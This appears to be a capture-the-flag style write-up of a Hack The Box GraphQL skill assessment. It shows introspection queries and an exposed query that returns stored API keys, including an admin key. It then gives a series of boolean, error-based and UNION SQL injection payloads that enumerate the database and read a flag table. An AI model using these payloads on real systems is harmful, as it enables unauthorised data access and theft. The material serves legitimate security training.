+++
title = 'Attacking GraphQl Skill Assessment | CWES on HTB'
date = '2026-06-21T03:16:15-04:00'
draft = false
slug = 'graphql-skill-assessment'
description = 'Exploiting GraphQL introspection to leak API keys, then chaining SQL injection through customer queries to dump the flag.'
tags = ["Web", "HTB"]
difficulty = 'easy'
+++

First explored the request and decided to see if the GraphiQL endpoint is enabled.

I started my test by sending an introspection query to know the relations between objects and queries.

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

After visualizing it in https://apis.guru/graphql-voyager/ it looks like:

![GraphQL schema visualization](feature.png)

I noticed `activeApikeys` and wanted to retrieve the data on it so just typed:

```graphql
{
  activeApikeys {
    id
    role
    key
  } 
}
```

The output is:

```json
{
  "data": {
    "activeApiKeys": [
      {
        "id": "QXBpS2V5T2JqZWN0OjE=",
        "role": "guest",
        "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"
      },
      {
        "id": "QXBpS2V5T2JqZWN0OjI=",
        "role": "guest",
        "key": "9cf8622bbc9fdc78f245663e08e5b4c1"
      },
      {
        "id": "QXBpS2V5T2JqZWN0OjM=",
        "role": "admin",
        "key": "0711a879ed751e63330a78a4b195bbad"
      }
    ]
  }
}
```

We now have the API key of the admin which may be used later.

## Enumerating Mutations and Arguments

My approach is to dump the database to see if there is a flag, so I wanted to test if there is SQLi in any argument. First I need to know which queries accept arguments.

I queried for mutation options using:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### Queries with Arguments

| Query | Arguments | Data Type |
|:--|:--|:--|
| `node` | `id` | `ID` (String) |
| `employeeByUsername` | `username` | `String` |
| `productByName` | `name` | `String` |
| `allCustomers` | `apiKey` | `String` |
| `customerByName` | `apiKey` | `String` |
| `customerByName` | `lastName` | `String` |

### Mutations with Arguments

| Mutation | Input Fields |
|:--|:--|
| `addEmployee` | `username` (String), `employeeId` (Int), `role` (String) |
| `addProduct` | `name` (String), `stock` (Int) |
| `addCustomer` | `apiKey` (String), `firstName` (String), `lastName` (String), `address` (String) |

## SQL Injection Testing

The approach now is to test each one with injection types to know which one is injectable.

### Approach 1: `employeeByUsername`

```graphql
{
  employeeByUsername(username: "admin") {
    username
    employeeId
    role
  }
}
```

Boolean-based detection:

```graphql
{
  employeeByUsername(username: "admin' AND '1'='1") {
    username
  }
}

{
  employeeByUsername(username: "admin' AND '1'='2") {
    username
  }
}
```

Error-based detection:

```graphql
{
  employeeByUsername(username: "admin'") {
    username
  }
}

{
  employeeByUsername(username: "admin'\"") {
    username
  }
}
```

UNION-based (4 columns: id, username, employeeId, role):

```graphql
{
  employeeByUsername(username: "x' UNION SELECT 1,'test',2,'test'-- -") {
    username
  }
}

{
  employeeByUsername(username: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

{
  employeeByUsername(username: "x' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}

{
  employeeByUsername(username: "x' UNION SELECT 1,flag,3,4 FROM flag LIMIT 1-- -") {
    username
  }
}
```

### Approach 2: `productByName`

```graphql
{
  productByName(name: "someproduct") {
    name
    stock
  }
}
```

Error-based:

```graphql
{
  productByName(name: "product'") {
    name
  }
}
```

UNION-based (3 columns: id, name, stock):

```graphql
{
  productByName(name: "x' UNION SELECT 1,'flag',999-- -") {
    name
    stock
  }
}

{
  productByName(name: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -") {
    name
  }
}

{
  productByName(name: "x' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='flag'-- -") {
    name
  }
}

{
  productByName(name: "x' UNION SELECT 1,flag,3 FROM flag LIMIT 1-- -") {
    name
  }
}
```

### Approach 3: `allCustomers` (apiKey)

```graphql
{
  allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {
    firstName
    lastName
    address
  }
}
```

Error-based:

```graphql
{
  allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad'") {
    firstName
  }
}
```

UNION-based (4 columns: id, firstName, lastName, address):

```graphql
{
  allCustomers(apiKey: "x' UNION SELECT 1,'flag','flag','flag' FROM some_table-- -") {
    firstName
    lastName
    address
  }
}

{
  allCustomers(apiKey: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -") {
    firstName
  }
}

{
  allCustomers(apiKey: "x' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'-- -") {
    firstName
  }
}

{
  allCustomers(apiKey: "x' UNION SELECT 1,flag,3,4 FROM flag LIMIT 1-- -") {
    firstName
  }
}
```

### Approach 4: `customerByName` — The Vulnerable Endpoint

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Smith") {
    firstName
    lastName
    address
  }
}
```

Test apiKey:

```graphql
{
  customerByName(apiKey: "x' UNION SELECT 1,'a','a','a'-- -", lastName: "Smith") {
    firstName
  }
}
```

Test lastName:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,'a','a','a'-- -") {
    firstName
  }
}
```

UNION-based enumeration on `lastName`:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -") {
    firstName
  }
}
```

This retrieves the tables:

```json
{
  "data": {
    "customerByName": {
      "firstName": "api_key,employee,flag,product,customer"
    }
  }
}
```

Now get the columns:

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'-- -") {
    firstName
  }
}
```

This gives us:

```json
{
  "data": {
    "customerByName": {
      "firstName": "id,flag"
    }
  }
}
```

## Reading the Flag

```graphql
{
  customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "x' UNION SELECT 1,GROUP_CONCAT(flag),3,4 FROM flag-- -") {
    firstName
  }
}
```

**NOTE:** The structure of the query and the number of columns we knew from the visual diagram which `customerByName` needs 4 columns so we made this in our UNION payload.
